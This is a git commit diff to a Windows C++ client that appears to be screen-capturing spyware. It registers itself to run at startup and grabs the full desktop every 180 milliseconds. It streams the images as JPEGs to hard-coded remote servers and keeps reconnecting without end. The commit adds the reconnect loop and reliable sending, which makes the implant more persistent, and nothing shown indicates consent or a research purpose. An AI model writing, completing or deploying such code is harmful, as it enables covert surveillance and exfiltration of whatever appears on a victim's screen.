2addc0cbda526e27d2b9d61af92e9da2f5a2cc89
kirilllolik23 <kiryshanice25@gmail.com>
2026-06-01 18:54:57 +0300

    lol

--- client.cpp
+++ client.cpp
@@ -40,78 +40,104 @@ int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
     return -1;
 }
 
-void SendScreen(SOCKET sock) {
+bool SendAll(SOCKET sock, const char* data, int len) {
+    int total = 0;
+    while (total < len) {
+        int sent = send(sock, data + total, len - total, 0);
+        if (sent <= 0) return false;
+        total += sent;
+    }
+    return true;
+}
+
+void SendScreenLoop() {
+    // Initialize GDI+ once
     Gdiplus::GdiplusStartupInput gdiplusStartupInput;
     ULONG_PTR gdiplusToken;
     Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
-
     CLSID jpegClsid;
     GetEncoderClsid(L"image/jpeg", &jpegClsid);
 
     while (true) {
-        HWND hwnd = GetDesktopWindow();
-        HDC hdc = GetDC(hwnd);
-        RECT rect;
-        GetClientRect(hwnd, &rect);
-        int w = rect.right, h = rect.bottom;
-
-        HDC hdcMem = CreateCompatibleDC(hdc);
-        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
-        SelectObject(hdcMem, hBitmap);
-        BitBlt(hdcMem, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
-
-        Gdiplus::Bitmap bitmap(hBitmap, NULL);
-        DeleteObject(hBitmap);
-        DeleteDC(hdcMem);
-        ReleaseDC(hwnd, hdc);
-
-        IStream* pStream = NULL;
-        CreateStreamOnHGlobal(NULL, TRUE, &pStream);
-        bitmap.Save(pStream, &jpegClsid, NULL);
-
-        STATSTG stat;
-        pStream->Stat(&stat, STATFLAG_NONAME);
-        ULONG jpegSize = stat.cbSize.LowPart;
-        BYTE* jpegData = new BYTE[jpegSize];
-        LARGE_INTEGER li = {};
-        pStream->Seek(li, STREAM_SEEK_SET, NULL);
-        ULONG bytesRead;
-        pStream->Read(jpegData, jpegSize, &bytesRead);
-        pStream->Release();
-
-        send(sock, (char*)&jpegSize, 4, 0);
-        int totalSent = 0;
-        while (totalSent < (int)jpegSize) {
-            int sent = send(sock, (char*)jpegData + totalSent, jpegSize - totalSent, 0);
-            if (sent <= 0) break;
-            totalSent += sent;
+        // ---------- Connect to server ----------
+        WSADATA wsa;
+        WSAStartup(MAKEWORD(2,2), &wsa);
+        SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
+        if (sock == INVALID_SOCKET) {
+            WSACleanup();
+            Sleep(5000);
+            continue;
         }
-        delete[] jpegData;
 
-        Sleep(180);
+        sockaddr_in addr;
+        addr.sin_family = AF_INET;
+        addr.sin_port = htons(PORT);
+        // Try both IPs
+        if (inet_pton(AF_INET, SERVER1, &addr.sin_addr) <= 0) {
+            inet_pton(AF_INET, SERVER2, &addr.sin_addr);
+        }
+
+        if (connect(sock, (sockaddr*)&addr, sizeof(addr)) != 0) {
+            closesocket(sock);
+            WSACleanup();
+            Sleep(5000); // wait 5 seconds before retry
+            continue;
+        }
+
+        // ---------- Send screenshots in a loop ----------
+        while (true) {
+            HWND hwnd = GetDesktopWindow();
+            HDC hdc = GetDC(hwnd);
+            RECT rect;
+            GetClientRect(hwnd, &rect);
+            int w = rect.right, h = rect.bottom;
+
+            HDC hdcMem = CreateCompatibleDC(hdc);
+            HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
+            SelectObject(hdcMem, hBitmap);
+            BitBlt(hdcMem, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
+
+            Gdiplus::Bitmap bitmap(hBitmap, NULL);
+            DeleteObject(hBitmap);
+            DeleteDC(hdcMem);
+            ReleaseDC(hwnd, hdc);
+
+            IStream* pStream = NULL;
+            CreateStreamOnHGlobal(NULL, TRUE, &pStream);
+            bitmap.Save(pStream, &jpegClsid, NULL);
+
+            STATSTG stat;
+            pStream->Stat(&stat, STATFLAG_NONAME);
+            ULONG jpegSize = stat.cbSize.LowPart;
+            BYTE* jpegData = new BYTE[jpegSize];
+            LARGE_INTEGER li = {};
+            pStream->Seek(li, STREAM_SEEK_SET, NULL);
+            ULONG bytesRead;
+            pStream->Read(jpegData, jpegSize, &bytesRead);
+            pStream->Release();
+
+            // Send length + data
+            if (!SendAll(sock, (char*)&jpegSize, 4) ||
+                !SendAll(sock, (char*)jpegData, jpegSize)) {
+                delete[] jpegData;
+                break; // connection lost, exit inner loop
+            }
+            delete[] jpegData;
+
+            Sleep(180);
+        }
+
+        closesocket(sock);
+        WSACleanup();
+        // If we reach here, the connection was lost; loop will try to reconnect
+        Sleep(3000);
     }
+
     Gdiplus::GdiplusShutdown(gdiplusToken);
 }
 
 int main() {
     AddToStartup();
-    WSADATA wsa;
-    WSAStartup(MAKEWORD(2,2), &wsa);
-
-    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
-    sockaddr_in addr;
-    addr.sin_family = AF_INET;
-    addr.sin_port = htons(PORT);
-
-    if (inet_pton(AF_INET, SERVER1, &addr.sin_addr) <= 0) {
-        inet_pton(AF_INET, SERVER2, &addr.sin_addr);
-    }
-
-    if (connect(sock, (sockaddr*)&addr, sizeof(addr)) == 0) {
-        SendScreen(sock);
-    }
-
-    closesocket(sock);
-    WSACleanup();
+    SendScreenLoop();   // this never returns
     return 0;
 }
